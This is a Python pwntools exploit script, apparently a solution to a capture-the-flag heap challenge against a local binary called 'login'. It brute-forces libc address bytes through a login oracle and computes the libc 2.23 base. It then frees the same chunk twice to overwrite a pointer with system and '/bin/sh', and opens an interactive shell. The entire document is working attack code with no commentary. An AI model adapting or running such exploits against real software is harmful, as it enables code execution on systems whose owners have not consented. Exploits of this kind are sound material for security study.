from pwn import *
# context.log_level='debug'
context.terminal=['tmux','splitw','-h']

libc=ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
def login(idx,leng,pswd):
    p.recvuntil(':\n')
    p.sendline("1")
    p.recvuntil(':\n')
    p.sendline(str(idx))
    p.recvuntil(':\n')
    p.sendline(str(leng))
    p.recvuntil(':\n')
    p.send(pswd)
    

def register(idx,leng,pswd):
    p.recv()
    p.sendline("2")
    p.recv()
    p.sendline(str(idx))
    p.recv()
    p.sendline(str(leng))
    p.recv()
    p.send(pswd)

def edit(idx,pswd):
    p.recv()
    p.sendline("4")
    p.recv()
    p.sendline(str(idx))
    p.recv()
    p.sendline(pswd)

def delete(idx):
    p.recv()
    p.sendline("3")
    p.recv()
    p.sendline(str(idx))

def dbg(code=""):
    gdb.attach(p,code)
while True:
    try:
        p=process("./login")
        register(0, 0x9f, '0')
        register(1, 0x30, '1')
        delete(0)
        aa=2
        leak='\x7f'
        for j in range(3):
            pad = '\x01' * (4 - j)
            print hex(u64(pad.ljust(8, '\x00')))
            register(aa, 0x9f, pad)
            for i in range(0x100):
                pswd = pad+p8(i)+leak
                login(aa,8,pswd)
                result = p.recvuntil('\n')
                if result.find('su')!=-1:
                    leak=p8(i)+leak
                    break
            if j!=2:
                delete(aa)
            aa += 1
            
            print hex(u64(leak.ljust(8,'\x00')))
        leak = '\x78\x1b' + leak
        print(leak)
        libc.address = u64(leak.ljust(8, '\x00')) -0x3c4b78
        print hex(libc.address)
        delete(4)
        delete(1)
        delete(4)
        register(5,0x18,p64(next(libc.search("/bin/sh")))+p64(libc.symbols['system']))
        login(0, 10, '/bin/sh')
        if p.recv().find('su')!=-1:
            p.interactive()
            break
        else:
            p.close()
    except:
        p.close()
